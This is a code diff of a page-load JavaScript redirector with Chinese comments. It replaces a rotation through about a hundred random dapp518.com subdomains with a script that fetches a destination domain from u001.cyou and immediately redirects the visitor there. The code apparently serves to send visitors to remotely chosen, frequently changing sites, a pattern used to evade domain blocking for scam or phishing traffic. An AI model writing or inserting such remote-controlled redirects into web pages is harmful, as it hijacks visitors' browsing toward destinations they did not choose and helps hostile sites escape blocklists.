@@ -1,118 +1,12 @@
 window.onload = function() {
-            
-            const urls = [
-'fpbl2.dapp518.com',
-'cbrwl.dapp518.com',
-'k97hg.dapp518.com',
-'t8tf8.dapp518.com',
-'zo3pq.dapp518.com',
-'t77xc.dapp518.com',
-'zpmvh.dapp518.com',
-'e8ztc.dapp518.com',
-'wxmu9.dapp518.com',
-'xo8eg.dapp518.com',
-'j95ln.dapp518.com',
-'l916r.dapp518.com',
-'yr7rj.dapp518.com',
-'amvro.dapp518.com',
-'aoydg.dapp518.com',
-'pr3nj.dapp518.com',
-'jy31t.dapp518.com',
-'h8r4a.dapp518.com',
-'9dmtc.dapp518.com',
-'lbjvb.dapp518.com',
-'srpj6.dapp518.com',
-'f4oi5.dapp518.com',
-'96vcg.dapp518.com',
-'aoop7.dapp518.com',
-'e5g02.dapp518.com',
-'35hlk.dapp518.com',
-'y7b2d.dapp518.com',
-'kv07i.dapp518.com',
-'8ns6p.dapp518.com',
-'ylqlw.dapp518.com',
-'2f2cz.dapp518.com',
-'cxo0y.dapp518.com',
-'s8ujg.dapp518.com',
-'91qhi.dapp518.com',
-'i9mnx.dapp518.com',
-'j4nno.dapp518.com',
-'lzqpr.dapp518.com',
-'tebo1.dapp518.com',
-'38st5.dapp518.com',
-'9s2r5.dapp518.com',
-'wx1w5.dapp518.com',
-'yn316.dapp518.com',
-'o9iia.dapp518.com',
-'95n92.dapp518.com',
-'5eeh9.dapp518.com',
-'dun6y.dapp518.com',
-'fs7v8.dapp518.com',
-'gcm03.dapp518.com',
-'lxnh4.dapp518.com',
-'i6c1p.dapp518.com',
-'d1xf5.dapp518.com',
-'rlzjq.dapp518.com',
-'pgb34.dapp518.com',
-'blsvr.dapp518.com',
-'lsoaf.dapp518.com',
-'92rvf.dapp518.com',
-'mj7qs.dapp518.com',
-'s6xb9.dapp518.com',
-'n8prv.dapp518.com',
-'spor7.dapp518.com',
-'81ywr.dapp518.com',
-'vn2yz.dapp518.com',
-'pw26c.dapp518.com',
-'zzi37.dapp518.com',
-'gk8d6.dapp518.com',
-'40ke4.dapp518.com',
-'lvew3.dapp518.com',
-'8knmm.dapp518.com',
-'z0k7y.dapp518.com',
-'s006t.dapp518.com',
-'q5au6.dapp518.com',
-'umoc7.dapp518.com',
-'xw4re.dapp518.com',
-'scfmm.dapp518.com',
-'kl7b4.dapp518.com',
-'73pp7.dapp518.com',
-'joclp.dapp518.com',
-'weugn.dapp518.com',
-'y1l89.dapp518.com',
-'vybkh.dapp518.com',
-'2wgsm.dapp518.com',
-'e4yef.dapp518.com',
-'v7mk0.dapp518.com',
-'o0pcs.dapp518.com',
-'zqbhu.dapp518.com',
-'avbvs.dapp518.com',
-'w9xkz.dapp518.com',
-'uyn5i.dapp518.com',
-'exje4.dapp518.com',
-'0toh4.dapp518.com',
-'66tv1.dapp518.com',
-'yrs7s.dapp518.com',
-'9pg36.dapp518.com',
-'ceksu.dapp518.com',
-'kjts0.dapp518.com',
-'zztx8.dapp518.com',
-'ricpq.dapp518.com',
-'jvvqp.dapp518.com'
-            ];
-
-           let redirectIndex = localStorage.getItem('redirectIndex');
-    if (redirectIndex === null) {
-        redirectIndex = 0;
-    } else {
-        redirectIndex = parseInt(redirectIndex, 10);
-    }
-
-    const nextUrl = 'https://' + urls[redirectIndex];
-
-    redirectIndex = (redirectIndex + 1) % urls.length;
-
-    localStorage.setItem('redirectIndex', redirectIndex);
-
-    window.location.replace(nextUrl);
+    // 从指定的URL获取新的域名
+    fetch('https://u001.cyou/url.php')
+        .then(response => response.text()) // 假设响应是纯文本
+        .then(domain => {
+            const nextUrl = 'https://' + domain.trim(); // 构建完整的URL
+            window.location.replace(nextUrl); // 重定向到新的URL
+        })
+        .catch(error => {
+            console.error('获取URL时出错：', error);
+        });
 };
